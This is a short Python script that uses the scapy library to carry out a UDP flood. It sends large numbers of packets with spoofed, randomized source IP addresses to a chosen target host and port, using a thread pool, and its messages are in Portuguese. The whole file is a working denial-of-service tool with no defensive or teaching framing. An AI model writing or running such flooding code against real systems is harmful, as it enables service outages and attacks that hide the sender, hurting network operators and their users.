from scapy.all import IP, UDP, RandIP, send
import threading
from concurrent.futures import ThreadPoolExecutor

def send_udp_packet(destiny, destiny_port):
    try:
        source = RandIP()

        ip_packet = IP(src=source, dst=destiny)
        udp_packet = UDP(dport=destiny_port)

        complete_packet = ip_packet / udp_packet
        send(complete_packet, verbose=False)
    except Exception as e:
        print(f"Erro ao enviar pacote: {e}")

def udpflood(destiny, destiny_port, num_of_packets, num_of_workers):
    with ThreadPoolExecutor(max_workers=num_of_workers) as executor:
        for _ in range(num_of_packets):
            executor.submit(send_udp_packet, destiny, destiny_port)

    print(f"Total de pacotes enviados: {num_of_packets}")